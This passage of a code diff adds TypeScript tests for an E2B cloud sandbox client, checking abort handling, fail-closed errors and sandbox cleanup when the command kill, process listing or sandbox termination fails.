+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      // Abort right before or at execution resolution
+      ac.abort();
+
+      await assert.rejects(
+        client.executeCommand(sandboxId, { command: 'race-command', signal: ac.signal }),
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+    });
+
+    it('fails closed with PROVIDER_ERROR and retains sandbox for retry when both command kill and sandbox kill fail (P1 Finding)', async () => {
+      let sandboxKillAttempts = 0;
+      let allowSandboxKillToSucceed = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-double-fail',
+              commands: {
+                async run() {
+                  return {
+                    pid: 8888,
+                    async wait() {
+                      return new Promise(() => {
+                        // Hanging command
+                      });
+                    },
+                    async kill() {
+                      // 1. Command kill fails
+                      throw new Error('RPC error: process kill failed');
+                    },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillAttempts++;
+                if (!allowSandboxKillToSucceed) {
+                  // 2. Sandbox kill also fails!
+                  throw new Error('E2B API unreachable: sandbox kill failed');
+                }
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'uncooperative-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+
+      // Trigger abort while running
+      ac.abort();
+
+      // Must NOT report EXECUTION_ABORTED when both cancellations failed!
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          // Fails closed with PROVIDER_ERROR, NOT EXECUTION_ABORTED
+          assert.equal(err.code, 'PROVIDER_ERROR');
+          assert.match(err.message, /Command cancellation failed and sandbox cleanup failed/);
+          return true;
+        }
+      );
+
+      // Verify sandbox was NOT marked destroyed (remote process not confirmed stopped)
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+      assert.equal(sandboxKillAttempts, 1);
+
+      // Verify retry reconciliation can clean up once provider recovers
+      allowSandboxKillToSucceed = true;
+      await client.destroySandbox(sandboxId);
+
+      // Now confirmed destroyed
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
+      assert.equal(sandboxKillAttempts, 2);
+    });
+
+    it('does not terminate sandbox when command kill returns false because process already exited (P2 Finding)', async () => {
+      let sandboxKillCalled = false;
+      let handleKillCalled = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-p2-check',
+              commands: {
+                async run() {
+                  return {
+                    pid: 7777,
+                    async wait() {
+                      return new Promise((resolve) => {
+                        // Simulates command finishing right before or during abort
+                        setTimeout(() => {
+                          resolve({
+                            exitCode: 0,
+                            stdout: 'done',
+                            stderr: '',
+                          });
+                        }, 5);
+                      });
+                    },
+                    async kill() {
+                      handleKillCalled = true;
+                      // Process not found because it already exited
+                      return false;
+                    },
+                  };
+                },
+                async list() {
+                  // Process is not running
+                  return [];
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'quick-exit-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify kill was attempted on handle
+      assert.equal(handleKillCalled, true);
+      // P2: Verify sandbox was NOT terminated unnecessarily!
+      assert.equal(sandboxKillCalled, false);
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+    });
+
+    it('falls back to terminating sandbox when command kill returns false and commands.list fails (Blocker Finding)', async () => {
+      let sandboxKillCalled = false;
+      let handleKillCalled = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-unconfirmed-list-error',
+              commands: {
+                async run() {
+                  return {
+                    pid: 6666,
+                    async wait() {
+                      return new Promise(() => {
+                        // Hanging command
+                      });
+                    },
+                    async kill() {
+                      handleKillCalled = true;
+                      // Returns false (not found by SIGKILL)
+                      return false;
+                    },
+                  };
+                },
+                async list() {
+                  // Querying process table fails with RPC/network error
+                  throw new Error('RPC error: failed to query sandbox processes');
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'unverifiable-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify individual kill was attempted
+      assert.equal(handleKillCalled, true);
+      // Because commands.list failed, process state was UNCONFIRMED!
+      // System MUST fall back to terminating the entire sandbox VM!
+      assert.equal(sandboxKillCalled, true);
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
+    });
+
+    it('fails closed with PROVIDER_ERROR when command kill returns false, commands.list fails AND sandbox kill fails (Blocker Finding)', async () => {
+      let sandboxKillAttempts = 0;
+      let allowSandboxKillToSucceed = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-unconfirmed-all-fail',
+              commands: {
+                async run() {
+                  return {
+                    pid: 5555,
+                    async wait() {
+                      return new Promise(() => {
+                        // Hanging command
+                      });
+                    },
+                    async kill() {
+                      // Returns false (unconfirmed)
+                      return false;
+                    },
+                  };
+                },
+                async list() {
+                  // Querying process table fails
+                  throw new Error('RPC error: failed to query sandbox processes');
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillAttempts++;
+                if (!allowSandboxKillToSucceed) {
+                  throw new Error('E2B API unreachable: sandbox termination failed');
+                }
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'double-unverifiable-cmd',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+      ac.abort();
+
+      // Because process state could not be verified AND sandbox kill failed,
+      // system MUST NOT report EXECUTION_ABORTED! It must fail closed with PROVIDER_ERROR!
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'PROVIDER_ERROR');
+          assert.match(err.message, /Command cancellation failed and sandbox cleanup failed/);
+          return true;
+        }
+      );
+
+      // Verify sandbox is retained in active registry with cleanup pending
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+      assert.equal(sandboxKillAttempts, 1);
+
+      // Verify retry reconciliation can clean up once provider recovers
+      allowSandboxKillToSucceed = true;
+      await client.destroySandbox(sandboxId);
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
+      assert.equal(sandboxKillAttempts, 2);
     });
   });
 });
